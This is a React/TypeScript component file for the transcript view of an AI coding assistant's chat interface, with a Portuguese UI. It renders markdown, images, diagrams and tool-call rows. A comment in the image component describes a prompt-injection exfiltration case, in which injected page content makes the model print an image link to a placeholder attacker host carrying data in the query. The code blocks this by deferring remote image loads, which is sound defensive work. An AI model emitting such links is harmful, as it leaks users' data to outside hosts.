import { Fragment, memo, useEffect, useMemo, useRef, useState, type ReactNode } from "react";
import { api, learnApi, type LearnedItem } from "../lib/api";
import {
  AlertTriangle,
  Bot,
  Brain,
  Check,
  ChevronRight,
  Copy,
  ExternalLink,
  FilePen,
  FileText,
  GitBranch,
  Globe,
  ImageOff,
  Info,
  ListTodo,
  Pencil,
  Search,
  Sparkles,
  Terminal,
  Undo2,
  Wrench,
  X,
  type LucideIcon,
} from "lucide-react";
import type { Block, ToolRow } from "../lib/turn";
import { ZerithMark } from "./ui";
import { FileLangBadge } from "./FileLangIcon";
import { TurnChanges } from "./Changes";
export { FileLangBadge };
import { highlightCode } from "./highlight";
import {
  parseBlocks,
  parseBlocksCached,
  splitStableMarkdown,
  type Inline,
  type MdBlock,
} from "./markdown";

/** "Aprendi: …" under an answer, with one undo for everything it saved. */
function LearnedNote(props: { text: string; items: LearnedItem[] }) {
  const [state, setState] = useState<"idle" | "busy" | "done" | string>("idle");
  const undo = () => {
    setState("busy");
    Promise.all(props.items.map((i) => learnApi.undo(i)))
      .then(() => setState("done"))
      .catch((e) => setState(String(e)));
  };
  const failed = state !== "idle" && state !== "busy" && state !== "done";
  return (
    <div className={"msg-note msg-learned" + (state === "done" ? " undone" : "")}>
      <Sparkles size={14} strokeWidth={2} aria-hidden />
      <span>{state === "done" ? "Desfeito: " + props.text.replace(/^Aprendi: /, "") : props.text}</span>
      {state === "done" ? null : (
        <button
          type="button"
          className="learned-undo"
          onClick={undo}
          disabled={state === "busy"}
          title={failed ? state : "Apagar o que foi aprendido neste turno"}
        >
          <Undo2 size={13} strokeWidth={2} aria-hidden />
          Desfazer
        </button>
      )}
      {failed ? <span className="learned-error">{state}</span> : null}
    </div>
  );
}

const isWeb = (src: string) => /^(https?:|data:)/i.test(src);
const USER_IMG = /^!\[([^\]\n]*)\]\(<([^>\n]+)>\)\s*$/gm;

/** Full-window view of one image; Esc or a click outside closes it. */
function Lightbox({ src, url, alt, onClose }: { src: string; url: string; alt: string; onClose: () => void }) {
  useEffect(() => {
    const onKey = (e: KeyboardEvent) => e.key === "Escape" && onClose();
    window.addEventListener("keydown", onKey);
    return () => window.removeEventListener("keydown", onKey);
  }, [onClose]);
  const open = () => (isWeb(src) ? void api.openUrl(src) : void api.openImage(src));
  return (
    <div className="lightbox" role="dialog" aria-label={alt || "Imagem"} onClick={onClose}>
      <img src={url} alt={alt} onClick={(e) => e.stopPropagation()} />
      <div className="lightbox-bar" onClick={(e) => e.stopPropagation()}>
        <span className="lightbox-name">{alt || src.split(/[\\/]/).pop()}</span>
        <button className="btn btn-sm" onClick={open}>
          <ExternalLink size={14} strokeWidth={2} />
          Abrir fora
        </button>
        <button className="icon-btn sm" onClick={onClose} aria-label="Fechar" title="Fechar (Esc)">
          <X size={16} strokeWidth={2} />
        </button>
      </div>
    </div>
  );
}

/** `![alt](src)`: web and data URLs load directly; a local path is read
 * through the core, which only hands back image files. */
function MdImage({ src, alt }: { src: string; alt: string }) {
  // A page the model read can make it print `![](https://attacker/x?d=...)`:
  // loading that by itself is a zero-click ping (or a leak in the query). A
  // remote image therefore waits for the click; local files and data: URLs
  // load as before.
  const remote = /^https?:/i.test(src);
  const [allowed, setAllowed] = useState(!remote);
  const [url, setUrl] = useState<string | null>(isWeb(src) && !remote ? src : null);
  const [failed, setFailed] = useState<string | null>(null);
  const [zoom, setZoom] = useState(false);
  useEffect(() => {
    setAllowed(!remote);
    setUrl(isWeb(src) && !remote ? src : null);
    setFailed(null);
    setZoom(false);
  }, [src, remote]);
  useEffect(() => {
    if (remote) {
      if (!allowed) return;
      setUrl(src);
      return;
    }
    if (isWeb(src)) return;
    let live = true;
    api
      .readImage(src)
      .then((u) => live && setUrl(u))
      .catch((e) => live && setFailed(String(e)));
    return () => {
      live = false;
    };
  }, [src, remote, allowed]);
  if (failed) {
    return (
      <span className="md-img-fail" title={failed}>
        <ImageOff size={14} strokeWidth={2} />
        {alt || src}
      </span>
    );
  }
  if (!allowed) {
    let host = src;
    try {
      host = new URL(src).host;
    } catch {
      /* keep the raw text */
    }
    return (
      <button
        type="button"
        className="md-img-pending"
        onClick={() => setAllowed(true)}
        title={src}
      >
        <ImageOff size={14} strokeWidth={2} aria-hidden />
        <span>Imagem de {host}</span>
        <span className="md-img-load">Carregar</span>
      </button>
    );
  }
  if (!url) return <span className="md-img loading" aria-label="Carregando imagem" />;
  if (url.startsWith("data:video/") || /\.(mp4|m4v|webm|mov)$/i.test(src)) {
    return <video className="md-video" src={url} controls preload="metadata" aria-label={alt || "Vídeo"} />;
  }
  return (
    <>
      <button className="md-img" onClick={() => setZoom(true)} title={alt || "Ampliar"}>
        <img src={url} alt={alt} loading="lazy" onError={() => setFailed("não carregou")} />
      </button>
      {zoom ? <Lightbox src={src} url={url} alt={alt} onClose={() => setZoom(false)} /> : null}
    </>
  );
}

// First match wins, so web_search is a Globe before "search" makes it a lens.
const TOOL_ICONS: [RegExp, LucideIcon][] = [
  [/todo/, ListTodo],
  [/web|fetch|http|url|browse/, Globe],
  [/bash|shell|exec|command|terminal|powershell/, Terminal],
  [/grep|glob|search|find/, Search],
  [/write|edit|patch|replace|create/, FilePen],
  [/read|view|cat/, FileText],
  [/agent|task|delegate/, Bot],
];

/** The icon a tool row (and the approval card) shows for a tool name. */
export function toolIcon(name: string): LucideIcon {
  const n = name.toLowerCase();
  return TOOL_ICONS.find(([re]) => re.test(n))?.[1] ?? Wrench;
}

const ARG_KEYS = ["path", "file_path", "filePath", "pattern", "command", "cmd", "url", "query", "glob", "prompt", "description"];

function parseArgs(args: string): unknown {
  try {
    return JSON.parse(args);
  } catch {
    return null;
  }
}

/** The one argument worth reading in a collapsed row: the path, the command… */
function argSummary(args: string): string {
  const v = parseArgs(args) as Record<string, unknown> | null;
  if (v && typeof v === "object") {
    const key = ARG_KEYS.find((k) => typeof v[k] === "string");
    const first = key ? v[key] : Object.values(v).find((x) => typeof x === "string");
    return typeof first === "string" ? first.replace(/\s+/g, " ") : "";
  }
  return args.replace(/\s+/g, " ");
}

function CopyButton({ text, label }: { text: string; label?: string }) {
  const [done, setDone] = useState(false);
  const copy = () =>
    void navigator.clipboard
      ?.writeText(text)
      .then(() => {
        setDone(true);
        setTimeout(() => setDone(false), 1400);
      })
      .catch(() => undefined);
  const name = done ? "Copiado" : (label ?? "Copiar");
  return (
    <button className={"copy-btn" + (done ? " done" : "")} onClick={copy} aria-label={name} title={name}>
      {done ? <Check size={14} strokeWidth={2} /> : <Copy size={14} strokeWidth={2} />}
      {label ? <span>{name}</span> : null}
    </button>
  );
}

function inlines(nodes: Inline[]): ReactNode[] {
  return nodes.map((n, i) => {
    if (typeof n === "string") {
      if (!n.includes("\n")) return n;
      return <Fragment key={i}>{n.split("\n").map((s, j) => (j ? [<br key={j} />, s] : s))}</Fragment>;
    }
    if (n.t === "code") return <code key={i}>{n.v}</code>;
    if (n.t === "img") return <MdImage key={i} src={n.src} alt={n.alt} />;
    if (n.t === "a") {
      return (
        <a key={i} href={n.href} target="_blank" rel="noreferrer noopener">
          {inlines(n.c)}
        </a>
      );
    }
    const Tag = n.t === "b" ? "strong" : n.t === "i" ? "em" : "s";
    return <Tag key={i}>{inlines(n.c)}</Tag>;
  });
}

const HighlightedCode = memo(function HighlightedCode({
  lang,
  text,
}: {
  lang: string;
  text: string;
}) {
  const tokens = useMemo(() => highlightCode(lang, text), [lang, text]);
  return (
    <>
      {tokens.map((t, idx) =>
        t.cls ? (
          <span key={idx} className={t.cls}>
            {t.text}
          </span>
        ) : (
          <Fragment key={idx}>{t.text}</Fragment>
        ),
      )}
    </>
  );
});

type GraphNode = { id: string; label: string; layer: number; row: number };
type GraphEdge = { from: string; to: string; label: string };

function parseMermaidGraph(src: string): { nodes: GraphNode[]; edges: GraphEdge[] } | null {
  const nodesMap = new Map<string, string>();
  const edges: GraphEdge[] = [];
  const cleanLabel = (raw: string) =>
    raw
      .trim()
      .replace(/^["'[(]+|["'\])]+$/g, "")
      .replace(/\\n/g, " · ");

  const parseEndpoint = (token: string): string => {
    const t = token.trim();
    const m = /^([A-Za-z0-9_.-]+)\s*(?:\[([^\]]+)\]|"([^"]+)"|\(([^)]+)\)|\{([^}]+)\})?/.exec(t);
    if (!m) return t;
    const id = m[1];
    const lbl = m[2] || m[3] || m[4] || m[5];
    if (lbl && !nodesMap.has(id)) {
      nodesMap.set(id, cleanLabel(lbl));
    } else if (!nodesMap.has(id)) {
      nodesMap.set(id, id);
    }
    return id;
  };

  for (const rawLine of src.split("\n")) {
    const line = rawLine.trim();
    if (
      !line ||
      line.startsWith("%%") ||
      /^(graph|flowchart|subgraph|end|style|classDef|class|direction)\b/i.test(line)
    ) {
      continue;
    }
    const edgeMatch =
      /^(.+?)\s*(?:-->|---|==>|-\.->)\s*(?:\|([^|]+)\|\s*)?(.+)$/.exec(line) ||
      /^(.+?)\s*--\s*([^-|>]+?)\s*-->\s*(.+)$/.exec(line);
    if (edgeMatch) {
      const from = parseEndpoint(edgeMatch[1]);
      const edgeLabel = (edgeMatch[2] ?? "").trim();
      const to = parseEndpoint(edgeMatch[3]);
      if (from && to) {
        edges.push({ from, to, label: edgeLabel });
      }
    }
  }

  if (nodesMap.size < 2 || edges.length === 0) return null;

  const inDegree = new Map<string, number>();
  const adj = new Map<string, string[]>();
  for (const id of nodesMap.keys()) {
    inDegree.set(id, 0);
    adj.set(id, []);
  }
  for (const e of edges) {
    inDegree.set(e.to, (inDegree.get(e.to) ?? 0) + 1);
    adj.get(e.from)?.push(e.to);
  }

  const layerMap = new Map<string, number>();
  const queue: string[] = [];
  for (const [id, deg] of inDegree.entries()) {
    if (deg === 0) {
      layerMap.set(id, 0);
      queue.push(id);
    }
  }
  if (queue.length === 0) {
    const first = nodesMap.keys().next().value;
    if (first) {
      layerMap.set(first, 0);
      queue.push(first);
    }
  }
  while (queue.length > 0) {
    const cur = queue.shift()!;
    const curLayer = layerMap.get(cur) ?? 0;
    for (const nxt of adj.get(cur) ?? []) {
      if (!layerMap.has(nxt)) {
        layerMap.set(nxt, Math.min(curLayer + 1, 8));
        queue.push(nxt);
      }
    }
  }
  for (const id of nodesMap.keys()) {
    if (!layerMap.has(id)) layerMap.set(id, 0);
  }

  const byLayer = new Map<number, string[]>();
  for (const [id, l] of layerMap.entries()) {
    const arr = byLayer.get(l) ?? [];
    arr.push(id);
    byLayer.set(l, arr);
  }

  const nodes: GraphNode[] = [];
  for (const [layer, ids] of byLayer.entries()) {
    ids.forEach((id, row) => {
      nodes.push({
        id,
        label: nodesMap.get(id) ?? id,
        layer,
        row,
      });
    });
  }
  return { nodes, edges };
}

function MermaidDiagramBlock({ lang, text }: { lang: string; text: string }) {
  const graph = useMemo(() => parseMermaidGraph(text), [text]);
  const [view, setView] = useState<"diagram" | "code">(graph ? "diagram" : "code");

  if (!graph) {
    return (
      <div className="md-code">
        <div className="md-code-bar">
          <span>{lang || "mermaid"}</span>
          <CopyButton text={text} label="Copiar" />
        </div>
        <pre>
          <code>
            <HighlightedCode lang={lang} text={text} />
          </code>
        </pre>
      </div>
    );
  }

  const maxLayer = Math.max(...graph.nodes.map((n) => n.layer), 0);
  const maxRow = Math.max(...graph.nodes.map((n) => n.row), 0);
  const colW = 210;
  const rowH = 74;
  const nodeW = 164;
  const nodeH = 42;
  const padX = 28;
  const padY = 24;
  const width = Math.max(420, (maxLayer + 1) * colW + padX * 2);
  const height = Math.max(130, (maxRow + 1) * rowH + padY * 2);
  const pos = new Map<string, { x: number; y: number }>();
  for (const n of graph.nodes) {
    pos.set(n.id, {
      x: padX + n.layer * colW,
      y: padY + n.row * rowH,
    });
  }

  return (
    <div className="md-code">
      <div className="md-code-bar">
        <span>{lang} · topologia</span>
        <div style={{ display: "flex", gap: 6, alignItems: "center" }}>
          <button
            type="button"
            className="copy-btn"
            onClick={() => setView(view === "diagram" ? "code" : "diagram")}
          >
            <span>{view === "diagram" ? "Ver código" : "Ver diagrama"}</span>
          </button>
          <CopyButton text={text} label="Copiar" />
        </div>
      </div>
      {view === "diagram" ? (
        <div style={{ overflowX: "auto", padding: "12px 8px" }}>
          <svg
            width={width}
            height={height}
            viewBox={`0 0 ${width} ${height}`}
            role="img"
            aria-label="Diagrama de topologia Mermaid"
          >
            <defs>
              <marker
                id="mermaid-arrow"
                viewBox="0 0 10 10"
                refX="9"
                refY="5"
                markerWidth="6"
                markerHeight="6"
                orient="auto-start-reverse"
              >
                <path d="M 0 1 L 10 5 L 0 9 z" fill="currentColor" opacity="0.65" />
              </marker>
            </defs>
            {graph.edges.map((e, idx) => {
              const p1 = pos.get(e.from);
              const p2 = pos.get(e.to);
              if (!p1 || !p2) return null;
              const x1 = p1.x + nodeW;
              const y1 = p1.y + nodeH / 2;
              const x2 = p2.x;
              const y2 = p2.y + nodeH / 2;
              const mx = (x1 + x2) / 2;
              const my = (y1 + y2) / 2 - 6;
              return (
                <g key={idx}>
                  <line
                    x1={x1}
                    y1={y1}
                    x2={x2}
                    y2={y2}
                    stroke="currentColor"
                    strokeOpacity="0.45"
                    strokeWidth="1.5"
                    markerEnd="url(#mermaid-arrow)"
                  />
                  {e.label ? (
                    <text
                      x={mx}
                      y={my}
                      textAnchor="middle"
                      fontSize="10"
                      fill="currentColor"
                      opacity="0.8"
                    >
                      {e.label.slice(0, 22)}
                    </text>
                  ) : null}
                </g>
              );
            })}
            {graph.nodes.map((n) => {
              const p = pos.get(n.id)!;
              return (
                <g key={n.id} transform={`translate(${p.x},${p.y})`}>
                  <rect
                    width={nodeW}
                    height={nodeH}
                    rx="8"
                    fill="var(--bg-elevated, rgba(127,127,127,0.12))"
                    stroke="currentColor"
                    strokeOpacity="0.35"
                    strokeWidth="1.25"
                  />
                  <text
                    x={nodeW / 2}
                    y={nodeH / 2 + 4}
                    textAnchor="middle"
                    fontSize="11.5"
                    fontWeight="600"
                    fill="currentColor"
                  >
                    {n.label.length > 22 ? n.label.slice(0, 20) + "…" : n.label}
                  </text>
                </g>
              );
            })}
          </svg>
        </div>
      ) : (
        <pre>
          <code>
            <HighlightedCode lang={lang} text={text} />
          </code>
        </pre>
      )}
    </div>
  );
}

function blocks(list: MdBlock[]): ReactNode[] {
  return list.map((b, i) => {
    switch (b.t) {
      case "h": {
        const Tag = `h${Math.min(b.level, 4)}` as "h1" | "h2" | "h3" | "h4";
        return <Tag key={i}>{inlines(b.c)}</Tag>;
      }
      case "p":
        return <p key={i}>{inlines(b.c)}</p>;
      case "list": {
        const items = b.items.map((it, j) => <li key={j}>{blocks(it)}</li>);
        return b.ordered ? (
          <ol key={i} start={b.start}>
            {items}
          </ol>
        ) : (
          <ul key={i}>{items}</ul>
        );
      }
      case "code":
        if (/^(mermaid|topology)$/i.test(b.lang.trim())) {
          return <MermaidDiagramBlock key={i} lang={b.lang} text={b.text} />;
        }
        return (
          <div key={i} className="md-code">
            <div className="md-code-bar">
              <span>{b.lang || "texto"}</span>
              <CopyButton text={b.text} label="Copiar" />
            </div>
            <pre>
              <code>
                <HighlightedCode lang={b.lang} text={b.text} />
              </code>
            </pre>
          </div>
        );
      case "quote":
        return <blockquote key={i}>{blocks(b.c)}</blockquote>;
      case "table":
        return (
          <div key={i} className="md-table">
            <table>
              <thead>
                <tr>
                  {b.head.map((c, k) => (
                    <th key={k} style={{ textAlign: b.align[k] ?? undefined }}>
                      {inlines(c)}
                    </th>
                  ))}
                </tr>
              </thead>
              <tbody>
                {b.rows.map((r, j) => (
                  <tr key={j}>
                    {r.map((c, k) => (
                      <td key={k} style={{ textAlign: b.align[k] ?? undefined }}>
                        {inlines(c)}
                      </td>
                    ))}
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        );
      case "hr":
        return <hr key={i} />;
    }
  });
}

const StableMarkdown = memo(function StableMarkdown({ text }: { text: string }) {
  const tree = useMemo(() => parseBlocksCached(text), [text]);
  return <>{blocks(tree)}</>;
});

function Markdown({ text, streaming }: { text: string; streaming: boolean }) {
  const { stable, tail } = useMemo(
    () => (streaming ? splitStableMarkdown(text) : { stable: text, tail: "" }),
    [text, streaming],
  );
  const tailTree = useMemo(
    () => (tail ? parseBlocks(tail) : []),
    [tail],
  );
  return (
    <div className={"md" + (streaming ? " streaming" : "")}>
      {stable ? <StableMarkdown text={stable} /> : null}
      {tailTree.length ? blocks(tailTree) : null}
    </div>
  );
}

const STATE_LABEL = { run: "executando", ok: "concluída", fail: "falhou" } as const;

const FILE_TOOLS = new Set([
  "read_file",
  "edit_file",
  "multi_edit",
  "write_file",
  "diagnostics",
  "lsp_definition",
  "lsp_references",
  "lsp_hover",
  "lsp_symbols",
]);

function toolActionLabel(name: string): string {
  switch (name) {
    case "read_file":
    case "diagnostics":
    case "lsp_definition":
    case "lsp_references":
    case "lsp_hover":
    case "lsp_symbols":
      return "Analyzed";
    case "edit_file":
    case "multi_edit":
      return "Edited";
    case "write_file":
      return "Created";
    case "grep":
    case "glob":
    case "repo_map":
    case "web_search":
    case "skill_search":
    case "session_search":
      return "Searched";
    case "list_dir":
      return "Listed";
    case "shell":
      return "Ran";
    case "net_connect":
      return "Connected";
    case "terminal_batch":
    case "net_broadcast":
      return "Executed";
    case "agent":
      return "Delegated";
    case "skill_load":
      return "Loaded skill";
    case "memory_save":
    case "memory_update":
    case "memory_forget":
    case "memory_recall":
      return "Memory";
    default:
      return name;
  }
}

function computeFileLineRange(name: string, argsObj: Record<string, unknown> | null, preview?: string): string | null {
  if (name !== "read_file") return null;
  const offset = typeof argsObj?.offset === "number" && argsObj.offset >= 1 ? Math.floor(argsObj.offset) : 1;
  const limit = typeof argsObj?.limit === "number" && argsObj.limit >= 1 ? Math.floor(argsObj.limit) : null;
  if (preview) {
    const m = /\[linhas\s+(\d+)-(\d+)\s+de\s+\d+/i.exec(preview);
    if (m) return `#L${m[1]}-${m[2]}`;
    const nums = [...preview.matchAll(/^(\d+)\t/gm)].map((x) => Number(x[1]));
    if (nums.length > 0) {
      const first = nums[0];
      const last = limit ? Math.max(nums[nums.length - 1], first + limit - 1) : nums[nums.length - 1];
      return `#L${first}-${last}`;
    }
  }
  if (limit) {
    return `#L${offset}-${offset + limit - 1}`;
  }
  return `#L${offset}`;
}

function ToolLine({ row }: { row: ToolRow }) {
  const [open, setOpen] = useState(false);
  const Icon = toolIcon(row.name);
  const arg = argSummary(row.args);
  const parsed = parseArgs(row.args);
  const argsObj = parsed && typeof parsed === "object" ? (parsed as Record<string, unknown>) : null;
  const body = row.preview ?? row.progress ?? (parsed ? JSON.stringify(parsed, null, 2) : row.args);
  const state = row.ok === undefined ? "run" : row.ok ? "ok" : "fail";
  const liveTail =
    state === "run" && row.progress
      ? row.progress.split(/\r?\n/).slice(-8).join("\n")
      : null;
  const rawPath =
    typeof argsObj?.path === "string"
      ? argsObj.path
      : typeof argsObj?.file_path === "string"
        ? argsObj.file_path
        : typeof argsObj?.filePath === "string"
          ? argsObj.filePath
          : null;
  const isFileTool = FILE_TOOLS.has(row.name) && Boolean(rawPath);
  const fileBase = rawPath ? (rawPath.split(/[\\/]/).pop() ?? rawPath) : "";
  const lineRange = isFileTool ? computeFileLineRange(row.name, argsObj, row.preview) : null;
  const label = toolActionLabel(row.name);
  return (
    <div className={`tool ${state}` + (open ? " open" : "")}>
      <button className="tool-head" onClick={() => setOpen(!open)} aria-expanded={open} disabled={!body}>
        {!isFileTool ? (
          <span className="tool-icon">
            <Icon size={14} strokeWidth={2} />
          </span>
        ) : null}
        <span className="tool-name">{label}</span>
        {isFileTool && rawPath ? (
          <span className="tool-file" title={rawPath}>
            <FileLangBadge path={rawPath} />
            <span className="tool-file-name">{fileBase}</span>
            {lineRange ? <span className="tool-range">{lineRange}</span> : null}
          </span>
        ) : (
          <span className="tool-arg" title={arg}>
            {arg}
          </span>
        )}
        <span className="spacer" />
        <span className="tool-state" role="img" aria-label={STATE_LABEL[state]}>
          {state === "run" ? (
            <span className="spinner" />
          ) : state === "ok" ? (
            <Check size={14} strokeWidth={2.25} />
          ) : (
            <X size={14} strokeWidth={2.25} />
          )}
        </span>
        <ChevronRight size={14} strokeWidth={2} className="chev" />
      </button>
      {liveTail && !open ? <pre className="tool-body live">{liveTail}</pre> : null}
      {open && body ? <pre className="tool-body">{body}</pre> : null}
    </div>
  );
}

const AssistantBlock = memo(function AssistantBlock(props: {
  block: Block & { kind: "assistant" };
  sessionId?: string | null;
  onBranch?: (id: number) => void;
}) {
  const [showReasoning, setShowReasoning] = useState(false);
  const b = props.block;
  const thinking = b.streaming && !b.text && b.tools.length === 0;
  return (
    <div className="msg-assistant">
      <span className="msg-avatar">
        <ZerithMark size={24} />
      </span>
      <div className="msg-body">
        {b.reasoning ? (
          <div className={"think" + (showReasoning ? " open" : "") + (thinking ? " live" : "")}>
            <button className="think-head" onClick={() => setShowReasoning(!showReasoning)} aria-expanded={showReasoning}>
              <Brain size={14} strokeWidth={2} />
              <span className="think-label">{thinking ? "Pensando…" : "Raciocínio"}</span>
              <ChevronRight size={14} strokeWidth={2} className="chev" />
            </button>
            {showReasoning ? <div className="think-body">{b.reasoning}</div> : null}
          </div>
        ) : null}
        {b.tools.length > 0 ? (
          <div className="tools">
            {b.tools.map((t) => (
              <ToolLine key={t.id} row={t} />
            ))}
          </div>
        ) : null}
        {b.text ? (
          <Markdown text={b.text} streaming={b.streaming} />
        ) : thinking && !b.reasoning ? (
          <span className="typing" role="status" aria-label="Respondendo">
            <span />
            <span />
            <span />
          </span>
        ) : null}
        {b.error ? (
          <div className="callout danger" role="alert">
            <AlertTriangle size={16} strokeWidth={1.75} />
            <div>
              <strong>A resposta não terminou</strong>
              <p>{b.error}</p>
            </div>
          </div>
        ) : null}
        {props.sessionId && b.stored && !b.streaming ? (
          <TurnChanges sessionId={props.sessionId} messageId={b.stored} />
        ) : null}
        {b.text && !b.streaming ? (
          <div className="msg-actions">
            <CopyButton text={b.text} label="Copiar" />
            {props.onBranch && b.stored ? (
              <button
                className="copy-btn"
                onClick={() => props.onBranch!(b.stored!)}
                aria-label="Ramificar daqui"
                title="Ramificar daqui: nova conversa com tudo até esta resposta"
              >
                <GitBranch size={14} strokeWidth={2} />
                <span>Ramificar daqui</span>
              </button>
            ) : null}
          </div>
        ) : null}
      </div>
    </div>
  );
});


/** One prompt, with its attached images and its "Editar" action. Memoised: it
 * never changes while the answer below it streams. */
const UserRow = memo(function UserRow(props: {
  block: Block & { kind: "user" };
  onEdit?: (id: number, text: string) => void;
}) {
  const b = props.block;
  const onEdit = props.onEdit;
  // Attached images arrive as `![nome](<path>)` lines (Composer).
  const imgs = useMemo(() => [...b.text.matchAll(USER_IMG)], [b.text]);
  const text = imgs.length ? b.text.replace(USER_IMG, "").trim() : b.text;
  return (
    <div className="msg-user-row">
      <div className="msg-user">
        {imgs.length ? (
          <div className="msg-user-imgs">
            {imgs.map((m, j) => (
              <MdImage key={j} src={m[2]} alt={m[1]} />
            ))}
          </div>
        ) : null}
        {text}
      </div>
      {onEdit && b.id != null ? (
        <div className="msg-actions">
          <button
            className="copy-btn"
            onClick={() => onEdit(b.id!, b.text)}
            aria-label="Editar"
            title="Editar: nova conversa a partir daqui com esta mensagem no campo"
          >
            <Pencil size={14} strokeWidth={2} />
            <span>Editar</span>
          </button>
        </div>
      ) : null}
    </div>
  );
});

export function Transcript(props: {
  blocks: Block[];
  tail?: React.ReactNode;
  sessionId?: string | null;
  /** A turn is running: no edit/branch until it lands. */
  busy?: boolean;
  onEdit?: (id: number, text: string) => void;
  onBranch?: (id: number) => void;
}) {
  const box = useRef<HTMLDivElement>(null);
  const pinned = useRef(true);
  const onEdit = props.busy ? undefined : props.onEdit;
  const onBranch = props.busy ? undefined : props.onBranch;

  useEffect(() => {
    const el = box.current;
    if (!el) return;
    const onScroll = () => {
      pinned.current = el.scrollHeight - el.scrollTop - el.clientHeight < 80;
    };
    el.addEventListener("scroll", onScroll);
    return () => el.removeEventListener("scroll", onScroll);
  }, []);

  // Scroll only the transcript: scrollIntoView would also move every
  // overflow:hidden ancestor (the sheet, the shell) and shift the layout.
  const toEnd = () => {
    const el = box.current;
    if (el && pinned.current) el.scrollTop = el.scrollHeight;
  };
  useEffect(toEnd, [props.blocks, props.tail]);

  // An image that finishes loading grows the stack without a new block;
  // keep the view pinned to the bottom when it was there.
  useEffect(() => {
    const stack = box.current?.firstElementChild;
    if (!stack) return;
    const ro = new ResizeObserver(toEnd);
    ro.observe(stack);
    return () => ro.disconnect();
  }, []);

  return (
    <div className="transcript" ref={box}>
      <div className="stack">
        {props.blocks.length === 0 ? (
          <div className="convo-empty">
            <ZerithMark size={32} />
            <p>Conversa vazia. Escreva abaixo para começar; use / para comandos e @ para citar arquivos.</p>
          </div>
        ) : null}
        {props.blocks.map((b, i) => {
          // A block the event did not touch keeps its reference, so `memo`
          // skips it: only the answer being written is re-rendered. The key is
          // the stored row when there is one, so a list that grows at the top
          // (a compaction note) does not re-key everything.
          const key =
            b.kind === "assistant" ? (b.stored ?? `a${i}`) : b.kind === "user" ? (b.id ?? `u${i}`) : `n${i}`;
          if (b.kind === "user") {
            return <UserRow key={key} block={b} onEdit={onEdit} />;
          }
          if (b.kind === "note" && b.learned?.length) {
            return <LearnedNote key={key} text={b.text} items={b.learned} />;
          }
          if (b.kind === "note") {
            return (
              <div key={key} className="msg-note">
                <Info size={14} strokeWidth={2} />
                <span>{b.text}</span>
              </div>
            );
          }
          return <AssistantBlock key={key} block={b} sessionId={props.sessionId} onBranch={onBranch} />;
        })}
        {/*
          The answer block is born on the first event, so a slow turn used to
          look frozen: the dots stand in for it while the turn is running.
        */}
        {props.busy &&
        !(
          props.blocks[props.blocks.length - 1]?.kind === "assistant" &&
          (props.blocks[props.blocks.length - 1] as { streaming?: boolean }).streaming
        ) ? (
          <AssistantBlock
            block={{ kind: "assistant", text: "", reasoning: "", tools: [], streaming: true }}
            sessionId={props.sessionId}
          />
        ) : null}
        {props.tail}
      </div>
    </div>
  );
}
